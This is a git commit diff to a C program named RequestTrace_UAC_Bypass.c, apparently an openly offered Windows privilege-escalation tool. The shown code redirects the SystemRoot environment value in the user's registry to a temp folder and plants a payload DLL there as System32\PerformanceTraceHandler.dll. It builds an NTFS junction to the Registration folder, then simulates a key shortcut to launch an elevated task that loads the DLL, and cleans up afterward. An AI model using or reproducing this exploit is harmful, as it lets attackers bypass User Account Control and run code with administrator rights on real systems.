9eb6ebd1d543a3c24ebb770f039197cb6b50e4d2
R41N3R_ZUF477 <R41N3R_ZUF477@outlook.com>
2025-03-13 13:46:07 +0100

    Fix REG_DB error (VMWare Tools)

--- RequestTrace_UAC_Bypass.c
+++ RequestTrace_UAC_Bypass.c
@@ -5,17 +5,47 @@
 #include <windows.h>
 #include <tlhelp32.h>
 
-#define DLLPATH "\\System32"
-#define DLLNAME "\\PerformanceTraceHandler.dll"
+#define DLLPATH L"\\System32"
+#define DLLNAME L"\\PerformanceTraceHandler.dll"
+#define REGDBPATH L"\\Registration"
 
-#define ENVREGKEY "Volatile Environment"
-#define ENVREGKEY2 "Volatile Environment\\0"
-#define ENVREGVALUE "SystemRoot"
+#define ENVREGKEY L"Volatile Environment"
+#define ENVREGVALUE L"SystemRoot"
 
 #define WAITFORTASK 2500
 
 #define CreateEnvEntryFunction CreateEnvEntry
 #define DeleteEnvEntryFunction DeleteEnvEntry
+
+#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)
+
+#define IO_REPARSE_TAG_MOUNT_POINT (0xA0000003L)
+
+typedef struct _REPARSE_DATA_BUFFER {
+	ULONG  ReparseTag;
+	USHORT ReparseDataLength;
+	USHORT Reserved;
+	union {
+		struct {
+			USHORT SubstituteNameOffset;
+			USHORT SubstituteNameLength;
+			USHORT PrintNameOffset;
+			USHORT PrintNameLength;
+			ULONG Flags;
+			WCHAR PathBuffer[1];
+		} SymbolicLinkReparseBuffer;
+		struct {
+			USHORT SubstituteNameOffset;
+			USHORT SubstituteNameLength;
+			USHORT PrintNameOffset;
+			USHORT PrintNameLength;
+			WCHAR PathBuffer[1];
+		} MountPointReparseBuffer;
+		struct {
+			UCHAR  DataBuffer[1];
+		} GenericReparseBuffer;
+	} DUMMYUNIONNAME;
+} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
 
 static HANDLE GetProcessTokenByPID(DWORD pid)
 {
@@ -112,61 +142,146 @@ static BOOL TerminateTaskhostW(DWORD pid, void* parameter)
 	return TRUE;
 }
 
-static BOOL CopyPayloadDLL(char* dllfile, char* basepath)
+// VMWare Tools and REG DB error fix
+static BOOL CreateRegistrationJunction(WCHAR* basepath)
 {
-	char dllpath[MAX_PATH];
-	int dir_len = 0;
+	BYTE rdb_buffer[sizeof(REPARSE_DATA_BUFFER) + 14 + sizeof(WCHAR) * MAX_PATH] = { 0 };
+	PREPARSE_DATA_BUFFER prdb = NULL;
+	WCHAR junction_path[MAX_PATH] = { 0 };
+	WCHAR regdb_path[100] = { 0 };
+	int regdb_path_len = 0;
+	ULONG rdb_path_size = 0;
+	ULONG rdb_size = 0;
+	HANDLE directory = NULL;
+	DWORD retbytes = 0;
 
-	(void)lstrcpynA(dllpath, basepath, MAX_PATH - 1 - sizeof(DLLPATH) - sizeof(DLLNAME));
-	lstrcatA(dllpath, DLLPATH);
-	dir_len = lstrlenA(dllpath);
-	if (!CreateDirectoryA(dllpath, NULL))
+	if (lstrlenW(basepath) > 240)
+	{
+		return FALSE;
+	}
+	lstrcpyW(junction_path, basepath);
+	lstrcatW(junction_path, REGDBPATH);
+	if (!GetSystemWindowsDirectoryW(regdb_path, 80))
+	{
+		return FALSE;
+	}
+	lstrcatW(regdb_path, REGDBPATH);
+	if (!CreateDirectoryW(junction_path, NULL))
 	{
 		if (GetLastError() != ERROR_ALREADY_EXISTS)
 		{
 			return FALSE;
 		}
 	}
-	lstrcatA(dllpath, DLLNAME);
-	if (!CopyFileA(dllfile, dllpath, FALSE))
+	regdb_path_len = lstrlenW(regdb_path) * sizeof(WCHAR) + sizeof(WCHAR);
+	rdb_path_size = regdb_path_len + 10;
+	rdb_size = REPARSE_DATA_BUFFER_HEADER_LENGTH + rdb_path_size;
+	memset(&rdb_buffer, 0, sizeof(rdb_buffer));
+	prdb = (PREPARSE_DATA_BUFFER)&rdb_buffer[0];
+	prdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+	prdb->Reserved = 0;
+	prdb->ReparseDataLength = (USHORT)rdb_path_size;
+	prdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
+	prdb->MountPointReparseBuffer.SubstituteNameLength = regdb_path_len - sizeof(WCHAR);
+	memcpy(prdb->MountPointReparseBuffer.PathBuffer, regdb_path, regdb_path_len);
+	prdb->MountPointReparseBuffer.PrintNameOffset = regdb_path_len;
+	prdb->MountPointReparseBuffer.PrintNameLength = 0;
+	directory = CreateFileW(junction_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
+	if (directory == INVALID_HANDLE_VALUE)
 	{
+		RemoveDirectoryW(junction_path);
+		return FALSE;
+	}
+	retbytes = 0;
+	if (!DeviceIoControl(directory, FSCTL_SET_REPARSE_POINT, prdb, rdb_size, NULL, 0, &retbytes, NULL))
+	{
+		wprintf(L"GLE 3: %u\n", (unsigned int)GetLastError());
+		CloseHandle(directory);
+		RemoveDirectoryW(junction_path);
+		return FALSE;
+	}
+	CloseHandle(directory);
+	return TRUE;
+}
+
+static BOOL DeleteRegistrationJunction(WCHAR* basepath)
+{
+	WCHAR junction_path[MAX_PATH] = { 0 };
+
+	if (lstrlenW(basepath) > 240)
+	{
+		return FALSE;
+	}
+	lstrcpyW(junction_path, basepath);
+	lstrcatW(junction_path, REGDBPATH);
+	return RemoveDirectoryW(junction_path);
+}
+
+static BOOL CopyPayloadDLL(WCHAR* dllfile, WCHAR* basepath)
+{
+	WCHAR dllpath[MAX_PATH] = { 0 };
+	int dir_len = 0;
+
+	if (!CreateRegistrationJunction(basepath))
+	{
+		return FALSE;
+	}
+	(void)lstrcpynW(dllpath, basepath, MAX_PATH - 1 - lstrlenW(DLLPATH) - lstrlenW(DLLNAME));
+	lstrcatW(dllpath, DLLPATH);
+	dir_len = lstrlenW(dllpath);
+	if (!CreateDirectoryW(dllpath, NULL))
+	{
+		if (GetLastError() != ERROR_ALREADY_EXISTS)
+		{
+			DeleteRegistrationJunction(basepath);
+			return FALSE;
+		}
+	}
+	lstrcatW(dllpath, DLLNAME);
+	if (!CopyFileW(dllfile, dllpath, FALSE))
+	{
+		DeleteRegistrationJunction(basepath);
 		dllpath[dir_len] = '\0';
-		RemoveDirectoryA(dllpath);
+		RemoveDirectoryW(dllpath);
 		return FALSE;
 	}
 	return TRUE;
 }
 
-static BOOL DeletePayloadDLL(char* basepath)
+static BOOL DeletePayloadDLL(WCHAR* basepath)
 {
-	char dllpath[MAX_PATH];
+	WCHAR dllpath[MAX_PATH] = { 0 };
 	int dir_len = 0;
 
-	(void)lstrcpynA(dllpath, basepath, MAX_PATH - 1 - sizeof(DLLPATH) - sizeof(DLLNAME));
-	lstrcatA(dllpath, DLLPATH);
-	dir_len = lstrlenA(dllpath);
-	lstrcatA(dllpath, DLLNAME);
-	if (!DeleteFileA(dllpath))
+	(void)lstrcpynW(dllpath, basepath, MAX_PATH - 1 - lstrlenW(DLLPATH) - lstrlenW(DLLNAME));
+	lstrcatW(dllpath, DLLPATH);
+	dir_len = lstrlenW(dllpath);
+	lstrcatW(dllpath, DLLNAME);
+	if (!DeleteFileW(dllpath))
 	{
 		return FALSE;
 	}
 	dllpath[dir_len] = '\0';
-	if (!RemoveDirectoryA(dllpath))
+	if (!RemoveDirectoryW(dllpath))
+	{
+		return FALSE;
+	}
+	if (!DeleteRegistrationJunction(basepath))
 	{
 		return FALSE;
 	}
 	return TRUE;
 }
 
-static BOOL CreateEnvEntry(char* basepath)
+static BOOL CreateEnvEntry(WCHAR* basepath)
 {
 	HKEY key = NULL;
 
-	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
+	if (RegOpenKeyExW(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
 	{
 		return FALSE;
 	}
-	if (RegSetValueExA(key, ENVREGVALUE, 0, REG_SZ, basepath, lstrlenA(basepath) + 1))
+	if (RegSetValueExW(key, ENVREGVALUE, 0, REG_SZ, (const BYTE*)basepath, lstrlenW(basepath) * sizeof(WCHAR) + sizeof(WCHAR)))
 	{
 		RegCloseKey(key);
 		return FALSE;
@@ -180,17 +295,17 @@ static BOOL DeleteEnvEntry()
 {
 	HKEY key = NULL;
 
-	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
+	if (RegOpenKeyExW(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_SET_VALUE, &key))
 	{
 		return FALSE;
 	}
-	RegDeleteValueA(key, ENVREGVALUE);
+	RegDeleteValueW(key, ENVREGVALUE);
 	RegCloseKey(key);
 
 	return TRUE;
 }
 
-static void Cleanup(char* basepath)
+static void Cleanup(WCHAR* basepath)
 {
 	DeleteEnvEntryFunction();
 	DeletePayloadDLL(basepath);
@@ -232,41 +347,41 @@ static BOOL PressShiftCtrlWinT()
 	return (SendInput(8, &inputs[0], sizeof(INPUT)) > 0);
 }
 
-static void print_help(char* executable)
+static void print_help(WCHAR* executable)
 {
-	printf("Usage: %s [bypass|cleanup|killelev|killall] [dll path]\n", executable);
+	wprintf(L"Usage: %ls [bypass|cleanup|killelev|killall] [dll path]\n", executable);
 }
 
-int main(int argc, char** argv)
+int wmain(int argc, WCHAR** argv)
 {
-	char tmppath[MAX_PATH];
+	WCHAR tmppath[MAX_PATH];
 
 	if (argc < 2)
 	{
 		print_help(argv[0]);
 		return 1;
 	}
-	if (!GetTempPathA(MAX_PATH - 1, tmppath))
+	if (!GetTempPathW(MAX_PATH - 1, tmppath))
 	{
-		printf("GetTempPath failed: %u!\n", GetLastError());
+		wprintf(L"GetTempPath failed: %u!\n", GetLastError());
 		return 1;
 	}
-	if (!lstrcmpiA(argv[1], "cleanup"))
+	if (!lstrcmpiW(argv[1], L"cleanup"))
 	{
 		Cleanup(tmppath);
 		return 0;
 	}
-	if (!lstrcmpiA(argv[1], "killelev"))
+	if (!lstrcmpiW(argv[1], L"killelev"))
 	{
 		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, NULL);
 		return 0;
 	}
-	if (!lstrcmpiA(argv[1], "killall"))
+	if (!lstrcmpiW(argv[1], L"killall"))
 	{
 		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, (void*)TRUE);
 		return 0;
 	}
-	if (lstrcmpiA(argv[1], "bypass"))
+	if (lstrcmpiW(argv[1], L"bypass"))
 	{
 		print_help(argv[0]);
 		return 1;
@@ -276,29 +391,29 @@ int main(int argc, char** argv)
 		print_help(argv[0]);
 		return 1;
 	}
-	printf("Copy DLL file \"%s\" ...\n", argv[2]);
+	wprintf(L"Copy DLL file \"%ls\" ...\n", argv[2]);
 	if (!CopyPayloadDLL(argv[2], tmppath))
 	{
-		printf("CopyPayloadDLL failed: %u!\n", GetLastError());
+		wprintf(L"CopyPayloadDLL failed: %u!\n", GetLastError());
 		return 1;
 	}
-	printf("Set environment \"%s\" value to \"%s\" ...\n", ENVREGVALUE, tmppath);
+	wprintf(L"Set environment \"%ls\" value to \"%ls\" ...\n", ENVREGVALUE, tmppath);
 	if (!CreateEnvEntryFunction(tmppath))
 	{
-		printf("CreateEnvEntryFunction failed: %u!\n", GetLastError());
+		wprintf(L"CreateEnvEntryFunction failed: %u!\n", GetLastError());
 		DeletePayloadDLL(tmppath);
 		return 1;
 	}
-	printf("Pressing Shift+Ctrl+Win+T to start the RequestTrace Task ...\n");
+	wprintf(L"Pressing Shift+Ctrl+Win+T to start the RequestTrace Task ...\n");
 	if (!PressShiftCtrlWinT())
 	{
-		printf("PressShiftCtrlWinT failed: %u!\n", GetLastError());
+		wprintf(L"PressShiftCtrlWinT failed: %u!\n", GetLastError());
 		Cleanup(tmppath);
 		return 1;
 	}
-	printf("Wait for Task to start ...\n");
+	wprintf(L"Wait for Task to start ...\n");
 	Sleep(WAITFORTASK);
-	printf("Cleanup ...\n");
+	wprintf(L"Cleanup ...\n");
 	Cleanup(tmppath);
 
 	return 0;
